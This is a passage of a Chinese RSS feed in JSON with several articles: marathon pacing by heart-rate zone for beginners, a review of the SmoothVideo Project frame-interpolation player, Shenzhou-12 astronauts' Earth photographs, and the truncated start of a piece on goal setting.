class=\"ztext-empty-paragraph\"><br></p>\n<h2>如何利用心率来确认自己的速度</h2>\n<p>跑者都知道跑步的心率会被划分为各个区间。其中有有氧慢跑心率区间/最佳燃脂区间、马拉松强度心率区间、乳酸阈值区间、无氧耐力区间等等。<br><br>以储备心率为例。计算公式为：</p>\n<p><b>目标心率区间=（最大心率-静息心率）x 储备心率区间（%）+静息心率</b><br></p>\n<p>跑马拉松可能会达到三个心率区间，依次为：</p>\n<ul>\n<li><b>有氧慢跑E心率区间：储备心率59%~74%</b></li>\n<li><b>马拉松强度M心率区间：储备心率74%~84%</b></li>\n<li><b>乳酸阈值T心率区间：储备心率84%~88%</b></li>\n</ul>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>——比如跑者A选手最大心率185，静息心率55，那他的储备心率就是130。E强度慢跑心率区间就在131~151之间。</p>\n<p>但<b>心率区间划分，更大意义在于定义强度，而非作为比赛的参考值</b>。</p>\n<p>比如其中的马拉松心率区间（M配速），对初阶跑者来说依然是强度较高的配速，以此强度跑全马，很容易在后半程出现崩盘情况。<br>马拉松跑者最长会在E~M强度间进行比赛，有余力的选手最后几公里稍微提速会接近T强度（但时间极短）。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>对初阶跑者（4小时30分-4小时整）来说，用心率确定速度的方式比较简单：</p>\n<ul>\n<li><b>前25公里：以不超过E区间的强度完成</b></li>\n<li><b>26公里-39公里：以介于E~M强度之间完成</b></li>\n<li><b>最后3公里：如有余力，可以小幅提速完成</b></li>\n</ul>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-794f777e1b863e3b8dcba7b6d41880db_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"853\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic4.zhimg.com/v2-794f777e1b863e3b8dcba7b6d41880db_r.jpg\"></figure><p><br>心率的高低与自身状态、外界环境都有关系。</p>\n<p>如比赛前一天休息未达预期，自我感觉不太好，就要适当降低比赛中的心率；遇到较高温度或湿度（以体感温度为准），此时跑步的消耗会更大，也需要降低心率。</p>\n<p>切记马拉松是场42公里的鏖战，42公里前任何一个距离超过预期的“放飞速度”都可能导致此前的努力付诸东流。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>初阶跑者马拉松比赛策略</h2>\n<p>全世界大型马拉松的平均完赛时间往往在4小时25分-4小时40分之间，而「破4」又是很多初阶跑者最常追求的目标。所以这个时间段意味着正常比赛，你身边可能都会有很多跑者簇拥着前行，并不会感到孤单。</p>\n<p>这个时间段的完赛选手通常有一定的训练量、对自身能力也有足够了解，想实现目标的关键，就在于最合理的发挥出自己实力。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1f2995cb9c80fafef2612db6ef4e8ecc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1500\" data-rawheight=\"1000\" class=\"origin_image zh-lightbox-thumb\" width=\"1500\" data-original=\"https://pic1.zhimg.com/v2-1f2995cb9c80fafef2612db6ef4e8ecc_r.jpg\"></figure><p><br><i><b>出发阶段（0-5公里）</b></i></p>\n<p>初阶跑者并不需要像精英跑者一样，进行30-40分钟的热身。可以通过比赛前10-15分钟的热身运动，外加比赛开始后前2-3公里作为热身。</p>\n<p>所以出发后的几公里，前10-15分钟最主要慢慢将身体“热”起来，心率逐渐提升至比赛状态，再开始整整的巡航。</p>\n<p>切记不要在比赛开始后过于兴奋，收不住速度冲出起点，尽量让配速和心率以缓慢提升的“爬坡”形态开启。</p>\n<p>将前五公里当成适应-投入比赛、并作为决策今天身体状态的依据，不要过分在意前五公里时间上的得失。</p>\n<p><br><i><b>比赛前半段（5-25公里）</b></i></p>\n<p>如果以心率来恒定，前20公里都应处于E心率区间内。即，25公里内最高心率不要超过自己的马拉松配速心率。很多人会在10-15公里之后迎来身体的一个正向反馈高峰，开始觉得脚步轻盈跑得很愉悦，常常收不住速度开始提速，这可能会导致你过快的消耗糖分，在30公里左右出现撞墙的情况。</p>\n<p>此时应尽可能保持住自己目标配速前进，即便身体暗示你可以跑的更快一些。</p>\n<p>补给方面，如果前5公里并未进站补水，接下来的5-10公里间最好能小口抿水。并且保证后面每隔5公里至少有一次50-100ml的补水。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>如额外需要补充能量胶（以每场比赛3个能量胶为例），15-18公里处可以吃掉第一个胶。有经验的选手通常也会计算好距离，在距离水站几百米时完成食用能量胶，到了水站后再辅以饮料——目前绝大多数能量胶都需约200ml饮用水搭配使用才能发挥最佳效果，且不会对肠胃有过强的刺激。</p>\n<h3><i>比赛中后段（26-38公里）</i></h3>\n<p>26-32公里会是很多初阶跑者比较难熬的一段，赛道上会陆续出现开始步行的选手，在心理上也会成为动摇的因素。依然保持匀速的完成，如体感已有明显的疲惫，适当放慢速度，待这种体感缓和，后面的路段也许会慢慢弥补回此前落后的时间。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>进入32公里后千万不要急躁，认为只剩下十公里应该提提速，这是很危险的想法。</p>\n<p>保持轻松的心态去继续奔跑。</p>\n<p>尽量不要让自己停下脚步，善于利用沿途地标，将距离分段化，完成后在心理上给自己一定的鼓励。如果实在体能耗竭不得不跑走结合，可以考虑围绕补给点进行——</p>\n<p>马拉松补给点通常每隔2.5公里设置一个，在补给站点前100-200米适当降速，补给点拿到水后每次饮用50ml-150ml的（小口多次饮用），而后再用50-100米慢慢启动，直至恢复目标配速。</p>\n<p>这样浪费掉的时间较少，也能较好的完成补给，同时让体能得到恢复。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3><i>最后完赛阶段（38公里-终点）</i></h3>\n<p>最后5公里，维持每个补给站抿一口水的习惯。</p>\n<p>比赛至今，能否完成目标已经很明朗。</p>\n<p>此时身体体能会接近耗竭的状态，即便体感良好，身体肌肉也很可能非常的紧张，盲目提速很可能导致抽筋情况，让比赛功亏一篑。需要做的，就是维持住该速度（不必过分紧张10秒左右的掉速，它影响不了太多最终成绩），稳妥的完成比赛。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bdfffe5344420fe862eec60a60e3a195_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-bdfffe5344420fe862eec60a60e3a195_r.jpg\"></figure><a href=\"https://zhuanlan.zhihu.com/p/408609083\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-36d4e32757b05ddf4312b2c401e04969_180x120.jpg\" data-image-width=\"5205\" data-image-height=\"2929\" class=\"internal\">马拉松比赛策略（下）：进阶跑者应该如何规划比赛中的分段配速？</a><hr>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-28bdbd944b7676c89ac2f0eb26e8d693_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2953\" data-rawheight=\"1181\" class=\"origin_image zh-lightbox-thumb\" width=\"2953\" data-original=\"https://pic4.zhimg.com/v2-28bdbd944b7676c89ac2f0eb26e8d693_r.jpg\"></figure><p>成为一名马拉松跑者：</p>\n<a href=\"https://zhuanlan.zhihu.com/p/70762450\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-34923bba92f3a88239ef94e667dcf8e6_180x120.jpg\" data-image-width=\"1280\" data-image-height=\"720\" class=\"internal\">从菜鸟到全马330：三个月时间，三套马拉松训练计划</a><a href=\"https://zhuanlan.zhihu.com/p/81209643\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-38a350a244ec3218b96d9e0ce998fafc_180x120.jpg\" data-image-width=\"720\" data-image-height=\"480\" class=\"internal\">距离马拉松还剩下1个月，我们应该如何准备？</a><a href=\"https://zhuanlan.zhihu.com/p/78805673\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-459505ee57d840d57678a83f088ed921_180x120.jpg\" data-image-width=\"2392\" data-image-height=\"1348\" class=\"internal\">距离只是跑步训练的一部分——先读懂训练计划，再开始跑步</a><a href=\"https://zhuanlan.zhihu.com/p/80742120\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-9e65fa94207329c601631ed59dae7a3c_180x120.jpg\" data-image-width=\"690\" data-image-height=\"460\" class=\"internal\">马拉松兔子：他们在前领跑，只为帮助更多人实现梦想</a><a href=\"https://zhuanlan.zhihu.com/p/92357659\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-837f06e5819495f5a925227e0bbf03cb_180x120.jpg\" data-image-width=\"2500\" data-image-height=\"1667\" class=\"internal\">马拉松赛后，到底需要排酸跑吗？</a><a href=\"https://zhuanlan.zhihu.com/p/188644335\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-c179019a4225a9767f92c6364e14c494_180x120.jpg\" data-image-width=\"5400\" data-image-height=\"3600\" class=\"internal\">一篇文章让你了解所有马拉松相关的专业名词</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/asicsya-se-shi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">ASICS亚瑟士</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/407946913?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"App+1｜借 SmoothVideo Project 享受「丝般顺滑」的观影体验","date":"2021-09-09 06:30:00","description":"\n<p>玩游戏的时候，我们都会关注一个技术指标，那就是帧率（Frame rate），它的意义在于每秒钟画面出现的帧数（frames per second, fps）。一般来说，帧数越高，画面就越流畅。比如游戏《原神》在移动端提供两档帧率，30 fps 和 60 fps，可供选择，无须多言，在硬件支持的情况下，60 fps 要比 30 fps 看起来流畅很多。</p>\n<p>那么，看电影呢？其实，标准的电影画面是以 24 fps 进行播放的。尽管听起来 24 fps 甚至还没有 30 fps 高，但是一般来说，由于电影中的动态模糊效果更为明显、真实，所以即使是 24 fps，我们也不会觉得非常不流畅。这也就是说，我们平常看到的大多数电影、电视剧，都是以 24 fps 进行播放的（尤其是在电脑、电视上）。</p>\n<p>尽管我们早就可以用更高的帧率进行数字拍摄（比如 iPhone 已经支持以 4K 60fps 进行拍摄）、显示屏也大多以 60Hz 进行刷新（甚至有许多设备已经用上了「高刷」，以 90Hz 乃至 120 Hz 进行刷新），也就是说可以以 60 fps 或者更高的帧率原生播放视频。然而，我们观看的内容还是以 24 fps 播放 —— 如果可以把电影转换成 60 fps 乃至更高呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn555b34td27usptu0.png\"></figure><p>软件 SmoothVideo Project（下文简称「SVP」），正是要把低帧率的电影、电视剧通过补偿中间帧的方式以更高帧率播放，从而达到「更加流畅」的观影体验。</p>\n<h2>原理、安装与配置</h2>\n<p>这款 app 背后的「核心技术」是<strong>插帧技术</strong>（frame interpolation technique）。这项技术能够通过对两帧之间的差异进行分析，对缺失的画面进行「技术上的弥补」，从而使得画面看起来更加流畅、真实。这项技术也常常用于处理慢动作视频，比如之前发布小米 11 Ultra 正是利用这项技术将 480 fps 的慢动作视频扩展到 1920 fps。</p>\n<h3>安装</h3>\n<p>到 <a href=\"https://www.svp-team.com/zh/get/\" target=\"_blank\">官网</a> 下载对应系统的安装包并按照提示安装即可。SVP 支持 Windows（7 / 8 / 10 / 11）、macOS（10.12 或以上版本）、Linux（64 位）和 Android（尚处于测试中，需要骁龙 855 或者更新的处理器）。</p>\n<h4>Windows</h4>\n<p>Windows 上安装 SVP 比较简单。在 Windows 安装配置的过程中，需要选择你目前使用的播放器。SVP 可以集成到各类播放器中（比如 VLC、mpv 等），如果需要，可以在这里勾选。其他设置暂时保留默认即可，如有需要，日后也可从 SVP 控制面板中再行配置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn55lb34td201m5uqg.png\"></figure><h4>macOS</h4>\n<p>在 macOS 上，由于 SVP 支持的播放器不能在安装的时候进行自动的播放器插件配置，所以，一定的手动步骤是必要的。</p>\n<ul>\n<li>\n<strong>必要：</strong>安装 <code>mpv</code>。<code>mpv</code> 是 SVP 所依赖的播放器，所以务必安装。使用下载的 SVP 镜像文件中的 <code>Install mpv.command</code> 可以方便地一次性安装 <code>Homebrew</code>、带有 <code>Vapoursynth</code> 支持的 <code>mpv</code>，以及写入推荐的 <code>mpv.conf</code> 配置文件。当然，如果你对一次性执行的代码不够放心，也可以参考镜像文件中的 <code>readme.rtf</code> 文件，手动进行安装配置，其中也主要用到了 <code>Homebrew</code>。</li>\n<li>\n<strong>根据个人使用情况选择：</strong> <code>readme.rtf</code> 文件还列出了 IINA 和 VLC 两款播放器的配置方法。其中，VLC 比较简单，IINA 则比较复杂，有兴趣、有需要的读者可以自行探索。下文也会提到 VLC 的配置方式。</li>\n</ul>\n<h3>第一次启动</h3>\n<p>第一次开启 SVP 时，app 会提示进行一次系统性能测试。系统性能测试可以帮助 app 自动匹配适合这台计算机的渲染配置（比如帧率、GPU 加速方式等等），不过这些配置可以后来手动更改。如果你不想测试，也可以点击跳过。此外，SVP 还会弹窗提示激活。如果你目前还不想购买这款 app，可以先点击试用，软件提供 30 天的评估时间。特别地，Linux 版本是免费的（相应地，功能有一定缺失）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn55lb34td201m5ur0.png\"></figure><h3>简单配置</h3>\n<p>启动后就可以对视频进行简单的配置了。你可以在这里调整想要播放视频的帧率（可以是根据视频原本的帧率或者是屏幕刷新率进行动态调整，也可以是固定一个帧率）、你想要的是更高的性能还是更好的视频质量、优化模式（电影还是动画），以及伪影去除的程度。如果在稍后播放视频的时候觉得不太满意，还可以回来进行调整。如果你觉得满意了，可以把配置保存起来，以便之后使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn55tb34td201m5urg.png\"></figure><p>让我们来播放一个视频吧！由于已经安装了 mpv，我们可以使用 SVP 内置的「打开文件」命令进行视频的播放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn565b34td201m5us0.png\"></figure><h2>多场景使用</h2>\n<p>SVP 可以通过内置的播放器（mpv）播放本地视频，也可以监视剪贴板，通过内置播放器来播放在线视频，这两项功能都是利用 GPU 运算实时进行补帧运算；你也可以在内置的帧率转换器中，把自己现有的视频转换为更高帧率，从而传送到其他设备观看。</p>\n<h3>使用播放器播放本地视频</h3>\n<p>直接使用「打开文件」命令就可以了。在播放的时候，你可以在屏幕的左下角看到一些参数，包括当前播放的文件帧率。如果文件帧率没有达到你的预期，可以考虑调整一下配置，让电脑算力能够满足需要。</p>\n<p>如果你需要使用第三方的播放器来配合一些特色功能使用（比如字幕、播放列表等等），在 Windows 上安装 SVP 的时候要记得进行相应的勾选，安装完成后要进行相应配置；macOS 上也是类似的。本文以 VLC 为例：只需要在 SVP 配置菜单的「工具」下勾选「VLC 的 SVP 插件」，之后在 VLC 中打开的视频就会自动按照当前的 SVP 配置进行播放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56db34td2ab6q9fg.png\"></figure><h3>播放网络流式视频（SVPtube）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56lb34td2engksh0.png\"></figure><p>想要播放网站上的视频，只需要把视频链接复制下来，SVPtube 会自动侦测到复制的链接，然后点击右侧「播放」按钮即可。</p>\n<p>经测试，SVPtube 以 <a href=\"https://github.com/ytdl-org\" target=\"_blank\">youtube-dl</a> 作为基础，可以灵敏地获取包括微博、B 站、YouTube 等常见视频网站的播放源并利用补帧技术进行高帧率播放。当然，如果是 youtube-dl 不支持的视频网站，那么也无法使用 SVPtube 进行播放。播放时使用的播放器默认是 mpv，不过可以在系统任务栏（Windows）或者菜单栏（Mac）上的 SVPtube 图标中进行自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56lb34td2engkshg.png\"></figure><p> </p>\n<h3>视频帧率转换</h3>\n<p>SVP 也提供了视频帧率转换的功能。例如，你的电视、手机或者是平板电脑并不能原生运行 SVP，但是可以在电脑上使用 SVP 将低帧率的视频转换为较高帧率之后，把转换后的文件拷贝到这些设备上播放。SVP 转换工具所使用的视频配置与上文「配置」页面中相同，此外，你还可以设置渲染视频时的计算方式、码率等等高级设置。默认情况下，转换的视频文件会与源文件存放在同一个文件夹下，文件名会以「SVP」结尾，文件类型也不会发生更改。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56tb34td27usptug.png\"></figure><h2>使用体验 Q &amp; A</h2>\n<h3>Q1：效果明显吗？</h3>\n<p>在实际使用 SVP 的过程中，我个人感觉效果还是十分明显的。升高帧率之后，画面变得更加「流畅」，而且整体给人的感觉的确更加栩栩如生。不过，问题在于，可能并不是每个人都会喜欢这种高帧率的观影方式。「电影质感」在很大程度上也是借助 24 fps 这个帧率所实现的。但是，如果你已经习惯了各种游戏的 60fps 帧率，我想，至少说高帧率电影是一种新奇的体验，这是不过分的。</p>\n<h3>Q2：硬件开销如何？</h3>\n<p>不过，这种新奇的体验，是以消耗更多硬件配置为代价的。在我的 2016 款基础版 MacBook Pro 上（Intel i5 6360U），1080p 视频已经无法以 60fps 进行即时流畅渲染，观看的过程中会出现明显的卡顿现象；但是在我 8 代 i7 处理器的 NUC 上，60fps 还是比较流畅的。</p>\n<p>示例图中我正在播放的是 1080p 48fps 视频。可见，我的 Mac 勉强可以维持 48fps 的帧率进行播放，此时 CPU 和内存都处于负载较重的状态，时不时掉帧，风扇也很快来到最大转速。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn575b34td27usptv0.png\"></figure><p>如果你是 Nvidia 图灵或者安培架构显卡的用户（RTX 20 系列和 RTX 30 系列），SVP 的使用体验可能会更好，因为它支持 Nvidia 的 Optical Flow SDK。这一技术能够为补帧计算过程提供更加优化的算法，速度更快、效率更高。我个人没有这么高级的 N 卡设备，所以无法进行实际的测试。有条件的读者，可以尝试。</p>\n<h3>Q3：有没有效果最好的帧率？</h3>\n<p>我尝试将一段 24fps 的视频转换成为 48fps（2x）、60fps（2.5x）和 120fps（5x），发现 48fps 和 60fps 的效果要明显好于 120fps，这提示我们，<strong>可能并非帧率越高越好</strong>。对于 24fps 的原始视频来说，如果通过插帧的方式补偿到 120fps，意味着原来的两帧之间要插入四帧，这一方面比较浪费计算资源 —— 我这一段 20 分钟的视频，转换为 120fps 花费的时间远长于 1 小时；而且在我电脑上如果实时渲染，帧率是无法达到 120fps 的。另一方面，在补帧过程中出错的概率也更高，播放时可以明显看出一定瑕疵。经过与本文责编的讨论，我们认为，<strong>把帧率设置在原帧率的 2-3 倍，效果最佳</strong>。</p>\n<h2>小结</h2>\n<p>从电影院到客厅再到卧室，影视作品总是我们消磨时光的好帮手。如果你也想以一种更高帧率的方式欣赏自己珍藏的影视大作，SVP 不妨一试。本文只介绍了基础的方法与使用体验，如果在使用软件的时候需要帮助，可以访问 SVP 的 <a href=\"https://www.svp-team.cn.com/wiki/Main_Page\" target=\"_blank\">在线帮助文档</a>，官方提供了非常完善的使用说明，并且有中文版。</p>\n<p>软件为买断制，售价 19.99 美元，提供试用版本，期限 30 天。试用期间，视频转换的结果带有水印，但即时渲染方式的视频不受此影响。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，不再错过任何一款好用的 App 💡</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68665"},{"title":"【美图·太空】高清原图！航天员摄影作品（二）——“壮美地球”专辑","date":"2021-09-09 05:11:29","description":"\n<p>神舟十二号航天员为我们带来了第二批在轨拍摄的高清图片。如同PS调色的红色湖水、来自大西洋的最后一滴眼泪、时隔九年再见的“曲线”。今天，“壮美地球”专辑，航天员刘伯明与汤洪波在中秋佳节之前，带你领略这世界的大好河山。</p>\n<p>世界第二大的咸水湖——乌鲁米耶湖，在7月的高温下，水分加速蒸发，水中的盐生杜氏藻产生胡萝卜素使整个乌鲁米耶湖呈现出迷人的锈红色，被白色盐滩包围的湖泊尽管美的令人心醉，但这红色却是她在干涸威胁下的呼救。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7ef885d41ed7d07058de560a8be9697c_b.jpg\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-7ef885d41ed7d07058de560a8be9697c_r.jpg\"></figure><p>在新疆克孜勒苏柯尔克孜自治州上空，航天员刘伯明看到的新疆大地苍茫浩渺。天山山脉上，来自大西洋的水汽在这里停下脚步，凝结成冰川，再融化为涓涓流水，滋养了天山以南，塔里木盆地里的戈壁沙漠。天山以北，“大西洋最后一滴眼泪”赛里木湖点缀在准噶尔盆地中，如同蓝天在水里安家，这澄澈的蓝美得叫人无暇他顾。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-22764c4ba1abfbc61d12aee8c9709c65_b.jpg\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-22764c4ba1abfbc61d12aee8c9709c65_r.jpg\"></figure><p>在太阳翼帆板与深邃宇宙所构成的夹角中，一条碧绿的玉带温柔的铺在亚欧大陆上，这是“世界第四长湖”巴尔喀什湖，中国新疆的伊犁河自南而北注入巴尔喀什湖西部，使这条“中亚玉带”呈现出西淡东咸的一湖两水现象。照片左下角，深不见底的伊塞克湖如同一颗蓝色的宝石深居在亚欧大陆的中心，一旁的雪山紧紧环绕，小心翼翼地将这美丽的湖泊从高原戈壁中轻轻托起。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b694c83df15b294fed928bd60dea4793_b.jpg\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-b694c83df15b294fed928bd60dea4793_r.jpg\"></figure><p>在亚美尼亚传说中，英雄哈伊克在美丽的凡湖和阿拉拉特山脚下为他的子民赢得属于他们的土地。从太空俯视安纳托利亚高原上的凡湖，如同一只直冲九霄的凤凰，绝云霓，负苍天，足乱浮云，翱翔乎杳冥之上。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-88571f783c20105af6c187b2700082c5_b.jpg\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-88571f783c20105af6c187b2700082c5_r.jpg\"></figure><p>2012年，神舟九号航天员乘组拍下“里海曲线”，一晃9年过去，里海仍然在原地静静地映出碧海蓝天，从景海鹏、刘洋、刘旺到聂海胜、刘伯明、汤洪波，大气层外，中国载人航天一直陪伴着这颗美丽的星球。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-51c7d576222d16e5099819b87d1a7947_b.jpg\" data-rawwidth=\"1080\" data-rawheight=\"1424\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-51c7d576222d16e5099819b87d1a7947_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-7495de57f04b6b6a044d8af0b9d1b5b9_b.jpg\" data-rawwidth=\"548\" data-rawheight=\"722\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"548\" data-original=\"https://pic2.zhimg.com/v2-7495de57f04b6b6a044d8af0b9d1b5b9_r.jpg\"></figure><p>（以上作品:刘哥）</p>\n<p>8月下旬，“彩虹之国”南非上空万里无云。作为金砖国家，南非和这片古老的大陆如今正焕发出新的生机与活力。未来，中国和南非等其他金砖国家还将航天领域继续深化合作，共同发展。中国将与全人类一同奔赴九天苍穹。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8f6d09469233d2d32ba5c7d88d38b20a_b.jpg\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-8f6d09469233d2d32ba5c7d88d38b20a_r.jpg\"><figcaption>汤哥</figcaption></figure><p>秘鲁高原下白浪翻滚的海洋，似是在细说千万年来这片大陆上的沧海桑田，蔚蓝色的海洋下，强大的上升性寒流从深处往海面上升运动，把海底的淤泥上泛，把大量的营养物质带到海面，滋养了大量浮游生物生存，形成秘鲁渔场，抚育了千万年来居住在这块大陆上的人们。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-78fd2cbf9201b473fbc3e99dc1df79ac_b.jpg\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-size=\"normal\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-78fd2cbf9201b473fbc3e99dc1df79ac_r.jpg\"><figcaption>汤哥</figcaption></figure><p>丘陵如织带，海峡如巨舌</p>\n<p>恬静的湖泊如大地明镜</p>\n<p>高原戈壁上绿洲点点如星辰</p>\n<p>这个绕着太阳默默自转的星球上</p>\n<p>每一寸山河都孕育了生命的浪漫</p>\n<p>悄悄告诉大家：航天员们也关注着大家的评论，大家还对天上的视角有哪些好奇，请积极留言评论哦！人还是要有梦想的，万一航天员们帮你实现了呢？</p>\n<p>供图/中国航天员中心</p>\n<p>技术支持/北京航天飞行控制中心</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wo-men-de-tai-kong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">我们的太空</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/408559873?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"对自己的现状不满意，应该怎么改变？","date":"2021-09-09 03:35:43","description":"\n<p>想要改变现状，只需要做到两点：建立合适的目标，并按照目标去做。</p>\n<h2>设定目标</h2>\n<p>想想那些人生导师们说的话：人生没有彩排，只有现场直播，所以每一件事都要努力做得最好！</p>\n<p>但，做不到最好，生活就没有意义么？实则不然，<b>你需要的是一个明确而艰巨的目标</b><sup data-text=\"E. Locke and G. Latham, “Building a Practically Useful Theory of Goal Setting and Task Motivation,”American Psychologist 57(2002):705-17\" data-url=\"\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\">[1]</sup><b>。</b>明确是为你带来具体实现的期望值，而艰巨则要让你放弃幻想面对现实，<b>困难但可能实现</b>（合理难度）才是关键。平衡两者的调味剂是学会善用适合自己的激励方式。</p>\n<p>研究还发现，设定并实现具有挑战性的任务，除了能带来优秀的绩效表现，更能带来极大的满足感和愉悦感<sup data-text=\"G. Latham and E. Locke, “New Developments in and Directions for Goal-Setting Research, ”European Psychologist 12(2002):290-300\" data-url=\"\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"2\">[2]</sup>，愉悦感又反过来提高了绩效，这就是高绩效循环。</p>\n<h2>修正目标</h2>\n<p>目标设定好后，我们则需要同时从<b>合意度（desirability）</b>与<b>可行度（feasibility）</b>两个角度去评估我们的目标<sup data-text=\"Y. Trope and N. Liberman, “Temporal Construal, ”Psychological Review 110 (2003): 403-21.\" data-url=\"\" data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"3\">[3]</sup>。</p>\n<p>合意度就是关注的是<b>“为什么”</b>，完成目标后到底有多有趣、多愉悦、多有益呢？它是一种面向未来的思考维度。</p>\n<p>而可行度关注的是<b>“是什么”</b>，你有多大的把握成功？有什么障碍会成为“拦路虎”？当我们考虑近期要做的事情时，我们更多想的是可行度。</p>\n<p>在设定长期目标的时候，我们只想着合意度，啊这个好，啊那个棒，完全没考虑可行性，临到设定的 DDL 